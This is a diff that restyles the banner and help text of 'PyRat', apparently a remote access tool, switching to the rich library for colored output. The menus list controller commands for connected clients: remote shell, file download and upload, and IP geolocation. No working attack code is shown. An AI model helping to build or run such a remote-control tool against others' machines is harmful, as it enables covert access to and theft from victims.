@@ -1,33 +1,31 @@
-ABOUT_BANNER = """
-========== PyRat ==========
-==== created by @erofcon =========
-==== https://github.com/erofcon ==
+from rich import print
 
+ABOUT_BANNER = """
+\t\t [bold red]PyRat[/bold red]
+\t created by @erofcon
+\t https://github.com/erofcon
 """
 
 MAIN_BANNER = """
 
-========== commands ==============
+[bold yellow]Commands:[/bold yellow]
 
- help | h       ->  show help 
- list | ls      ->  get all connected client
- connect <ID>   ->  connect to client by <ID>
+   help | h     \t show help 
+   list | ls    \t get all connected client
+   connect <ID> \t connect to client by <ID>
 
-
-
-==================================
 """
 
 CLIENT_BANNER = """
 
-========== commands ==============
+[bold yellow]Commands:[/bold yellow]
 
- help | h             ->  show help
- exit                 ->  exit to main menu
- geolocate            ->  get client geolocation with IP-address
- shell                ->  run shell
- download <filename>  ->  download file
- upload               ->  upload file
+ help | h             \t  show help
+ exit                 \t  exit to main menu
+ geolocate            \t  get client geolocation with IP-address
+ shell                \t  run shell
+ download <filename>  \t  download file
+ upload               \t  upload file
 
 """
 
